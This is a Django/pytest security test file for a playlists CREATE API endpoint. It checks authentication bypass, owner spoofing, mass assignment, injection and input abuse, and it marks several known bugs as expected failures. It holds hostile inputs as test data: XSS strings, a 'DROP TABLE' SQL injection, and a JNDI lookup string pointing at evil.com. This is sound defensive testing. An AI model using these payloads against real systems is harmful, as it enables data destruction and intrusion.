"""
RED TEAM: T224 - Playlists CREATE endpoint security tests.

Attack vectors:
- Anonymous CREATE (authentication bypass)
- BOLA: create playlist with other user as owner
- Mass assignment: id, created_at manipulation
- XSS in name/description
- SQL injection
- Duplicate name abuse
- Length abuse (very long strings)
"""

import json

import pytest

from model_bakery import baker

from api.schedule.models import Playlist


@pytest.mark.django_db(transaction=True)
class TestPlaylistCreateAuthentication:
    """CREATE authentication tests."""

    @pytest.mark.xfail(reason="T414: Anonymous CREATE playlist allowed")
    def test_create_without_auth(self, admin_client):
        """Anonymous CREATE should fail."""
        data = {"name": "Hacked Playlist"}
        response = admin_client.post(
            "/api/v2/playlists",
            json.dumps(data),
            content_type="application/json",
        )
        assert response.status_code in [
            401,
            403,
        ], "Anonymous can create playlists"


@pytest.mark.django_db(transaction=True)
class TestPlaylistCreateBOLA:
    """CREATE BOLA tests."""

    @pytest.mark.xfail(reason="T415: No owner validation on CREATE")
    def test_create_with_other_user_as_owner(
        self,
        admin_client,
        regular_user,
        admin_user,
    ):
        """Create playlist with another user as owner."""
        admin_client.force_authenticate(user=regular_user)
        data = {"name": "My Playlist", "owner": admin_user.id}
        response = admin_client.post(
            "/api/v2/playlists",
            json.dumps(data),
            content_type="application/json",
        )
        if response.status_code == 201:
            result = response.json()
            assert (
                result.get("owner") != admin_user.id
            ), "Can set other user as owner (BOLA)"


@pytest.mark.django_db(transaction=True)
class TestPlaylistCreateMassAssignment:
    """CREATE mass assignment tests."""

    def test_create_with_id_field(self, admin_client):
        """Try to set id during CREATE."""
        admin_client.force_authenticate(user=baker.make("core.User"))

        data = {"id": 99999, "name": "Test Playlist"}
        response = admin_client.post(
            "/api/v2/playlists",
            json.dumps(data),
            content_type="application/json",
        )

        if response.status_code == 201:
            result = response.json()
            assert result.get("id") != 99999, "ID was set via mass assignment"

    def test_create_with_created_at(self, admin_client):
        """Try to manipulate created_at during CREATE."""
        admin_client.force_authenticate(user=baker.make("core.User"))

        data = {"name": "Test Playlist", "created_at": "2020-01-01T00:00:00Z"}
        response = admin_client.post(
            "/api/v2/playlists",
            json.dumps(data),
            content_type="application/json",
        )

        if response.status_code == 201:
            result = response.json()
            assert not result.get("created_at", "").startswith(
                "2020",
            ), "created_at was manipulated via mass assignment"


@pytest.mark.django_db(transaction=True)
class TestPlaylistCreateXSS:
    """CREATE XSS injection tests."""

    @pytest.mark.xfail(reason="T416: XSS stored unescaped in name/description")
    def test_xss_in_name(self, admin_client):
        """Try XSS in playlist name."""
        admin_client.force_authenticate(user=baker.make("core.User"))

        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
        ]

        for payload in xss_payloads:
            data = {"name": payload}
            response = admin_client.post(
                "/api/v2/playlists",
                json.dumps(data),
                content_type="application/json",
            )

            if response.status_code == 201:
                result = response.json()
                if result.get("name") == payload:
                    pytest.fail(
                        f"BUG: XSS payload stored unescaped in name: {payload[:30]}",
                    )

    @pytest.mark.xfail(reason="T416: XSS stored unescaped in description")
    def test_xss_in_description(self, admin_client):
        """Try XSS in playlist description."""
        admin_client.force_authenticate(user=baker.make("core.User"))

        xss_payload = "<script>alert('XSS')</script>"
        data = {"name": "Test", "description": xss_payload}
        response = admin_client.post(
            "/api/v2/playlists",
            json.dumps(data),
            content_type="application/json",
        )

        if response.status_code == 201:
            result = response.json()
            if result.get("description") == xss_payload:
                pytest.fail("BUG: XSS payload stored unescaped in description")


@pytest.mark.django_db(transaction=True)
class TestPlaylistCreateSQLInjection:
    """CREATE SQL injection tests."""

    def test_sqli_in_name(self, admin_client):
        """Try SQL injection in name."""
        admin_client.force_authenticate(user=baker.make("core.User"))

        sqli_payloads = [
            "'; DROP TABLE cc_playlist;--",
            "' OR '1'='1",
        ]

        for payload in sqli_payloads:
            data = {"name": payload}
            response = admin_client.post(
                "/api/v2/playlists",
                json.dumps(data),
                content_type="application/json",
            )

            if response.status_code == 500:
                pytest.fail(f"BUG: SQLi in name: {payload}")


@pytest.mark.django_db(transaction=True)
class TestPlaylistCreateDuplicateAbuse:
    """Duplicate name abuse tests."""

    def test_create_duplicate_name(self, admin_client):
        """Try to create playlist with duplicate name."""
        user = baker.make("core.User")
        admin_client.force_authenticate(user=user)

        # Create first playlist
        baker.make(Playlist, name="My Playlist", owner=user)

        # Try to create duplicate
        data = {"name": "My Playlist"}
        response = admin_client.post(
            "/api/v2/playlists",
            json.dumps(data),
            content_type="application/json",
        )

        # Document behavior - may allow or reject duplicates
        assert response.status_code in [201, 403]

    def test_create_many_playlists(self, admin_client):
        """Try to create many playlists (resource exhaustion)."""

        created = 0
        for i in range(100):  # Try to create 100 playlists
            data = {"name": f"Playlist {i}"}
            response = admin_client.post(
                "/api/v2/playlists",
                json.dumps(data),
                content_type="application/json",
            )
            if response.status_code == 201:
                created += 1

        # Should allow multiple playlists
        assert created == 100, f"Only created {created} playlists"


@pytest.mark.django_db(transaction=True)
class TestPlaylistCreateLengthAbuse:
    """Length abuse tests."""

    def test_very_long_name(self, admin_client):
        """Try very long playlist name."""
        admin_client.force_authenticate(user=baker.make("core.User"))

        long_name = "A" * 10000
        data = {"name": long_name}
        response = admin_client.post(
            "/api/v2/playlists",
            json.dumps(data),
            content_type="application/json",
        )

        # Should limit name length
        assert response.status_code in [201, 400, 403]

    def test_very_long_description(self, admin_client):
        """Try very long description."""
        admin_client.force_authenticate(user=baker.make("core.User"))

        long_desc = "B" * 100000  # 100KB
        data = {"name": "Test", "description": long_desc}
        response = admin_client.post(
            "/api/v2/playlists",
            json.dumps(data),
            content_type="application/json",
        )

        # Should limit description length
        assert response.status_code in [201, 400, 403]


@pytest.mark.django_db(transaction=True)
class TestPlaylistCreateValidation:
    """CREATE validation bypass tests."""

    @pytest.mark.xfail(reason="T321: Null owner allowed")
    def test_create_with_null_owner(self, admin_client):
        """Try CREATE with null owner."""
        admin_client.force_authenticate(user=baker.make("core.User"))

        data = {"name": "Test Playlist", "owner": None}
        response = admin_client.post(
            "/api/v2/playlists",
            json.dumps(data),
            content_type="application/json",
        )
        assert response.status_code in [400, 403], "Null owner accepted"

    def test_create_with_empty_name(self, admin_client):
        """Try CREATE with empty name."""
        admin_client.force_authenticate(user=baker.make("core.User"))

        data = {"name": ""}
        response = admin_client.post(
            "/api/v2/playlists",
            json.dumps(data),
            content_type="application/json",
        )
        if response.status_code == 201:
            pytest.fail("BUG: Empty name accepted")

    def test_create_with_whitespace_name(self, admin_client):
        """Try CREATE with whitespace-only name."""
        admin_client.force_authenticate(user=baker.make("core.User"))

        data = {"name": "   "}
        response = admin_client.post(
            "/api/v2/playlists",
            json.dumps(data),
            content_type="application/json",
        )
        if response.status_code == 201:
            pytest.fail("BUG: Whitespace-only name accepted")

    def test_create_with_nonexistent_owner(self, admin_client):
        """Try CREATE with non-existent owner."""
        admin_client.force_authenticate(user=baker.make("core.User"))

        data = {"name": "Test", "owner": 99999}
        response = admin_client.post(
            "/api/v2/playlists",
            json.dumps(data),
            content_type="application/json",
        )
        if response.status_code == 201:
            pytest.fail("BUG: Non-existent owner accepted")


@pytest.mark.django_db(transaction=True)
class TestPlaylistCreateUnicodeAbuse:
    """Unicode abuse tests."""

    def test_unicode_in_name(self, admin_client):
        """Try Unicode in playlist name."""
        admin_client.force_authenticate(user=baker.make("core.User"))

        unicode_names = [
            "🔥 Fire Playlist 🔥",
            "日本語プレイリスト",
            "العربية",
            "<svg onload=alert('XSS')>",
            "${jndi:ldap://evil.com}",
        ]

        for name in unicode_names:
            data = {"name": name}
            response = admin_client.post(
                "/api/v2/playlists",
                json.dumps(data),
                content_type="application/json",
            )

            if response.status_code == 500:
                pytest.fail(f"BUG: Unicode crash: {name}")

    def test_null_byte_in_name(self, admin_client):
        """Try null byte in name."""
        admin_client.force_authenticate(user=baker.make("core.User"))

        data = {"name": "Test\x00Playlist"}
        response = admin_client.post(
            "/api/v2/playlists",
            json.dumps(data),
            content_type="application/json",
        )

        if response.status_code == 500:
            pytest.fail("BUG: Null byte causes crash")
